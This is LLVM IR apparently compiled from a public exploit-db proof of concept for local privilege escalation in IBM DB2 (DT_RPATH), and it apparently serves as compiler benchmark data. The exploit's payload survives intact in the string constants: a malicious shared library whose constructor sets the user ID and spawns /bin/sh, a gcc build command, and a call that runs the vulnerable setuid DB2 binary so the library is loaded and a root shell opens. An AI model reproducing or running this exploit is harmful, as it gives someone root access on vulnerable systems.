; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_35918.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_35918.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [44 x i8] c"PoC exploit for IBM DB2 DT_RPATH privesc.\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"(c) Tim Brown, 2011\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"<mailto:timb@nth-dimension.org.uk>\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [68 x i8] c"<http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"Constructing bad_libkbb.so...\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"bad_libkbb.c\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"#include <stdio.h>\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"#include <unistd.h>\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [22 x i8] c"#include <stdlib.h>\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [56 x i8] c"void __attribute__ ((constructor)) bad_libkbb(void) {\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [39 x i8] c"\09printf(\22Have a root shell...\\r\\n\22);\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [22 x i8] c"\09setuid(geteuid());\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [26 x i8] c"\09system(\22/usr/bin/id\22);\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [22 x i8] c"\09system(\22/bin/sh\22);\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"\09exit(0);\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [4 x i8] c"}\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [44 x i8] c"gcc -shared -fPIC -o libkbb.so bad_libkbb.c\00", align 1
@.str.19 = private unnamed_addr constant [50 x i8] c"/opt/ibm/db2/V9.7/itma/tmaitm6/lx8266/bin/kbbacf1\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  %10 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %11 = call i32 @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %13 = call i32* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32* %13, i32** %6, align 8
  %14 = load i32*, i32** %6, align 8
  %15 = call i32 @fprintf(i32* %14, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %16 = load i32*, i32** %6, align 8
  %17 = call i32 @fprintf(i32* %16, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0))
  %18 = load i32*, i32** %6, align 8
  %19 = call i32 @fprintf(i32* %18, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.9, i64 0, i64 0))
  %20 = load i32*, i32** %6, align 8
  %21 = call i32 @fprintf(i32* %20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0))
  %22 = load i32*, i32** %6, align 8
  %23 = call i32 @fprintf(i32* %22, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.11, i64 0, i64 0))
  %24 = load i32*, i32** %6, align 8
  %25 = call i32 @fprintf(i32* %24, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.12, i64 0, i64 0))
  %26 = load i32*, i32** %6, align 8
  %27 = call i32 @fprintf(i32* %26, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.13, i64 0, i64 0))
  %28 = load i32*, i32** %6, align 8
  %29 = call i32 @fprintf(i32* %28, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.14, i64 0, i64 0))
  %30 = load i32*, i32** %6, align 8
  %31 = call i32 @fprintf(i32* %30, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.15, i64 0, i64 0))
  %32 = load i32*, i32** %6, align 8
  %33 = call i32 @fprintf(i32* %32, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i64 0, i64 0))
  %34 = load i32*, i32** %6, align 8
  %35 = call i32 @fprintf(i32* %34, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0))
  %36 = load i32*, i32** %6, align 8
  %37 = call i32 @fclose(i32* %36)
  %38 = call i32 @system(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.18, i64 0, i64 0))
  %39 = call i32 @system(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.19, i64 0, i64 0))
  %40 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
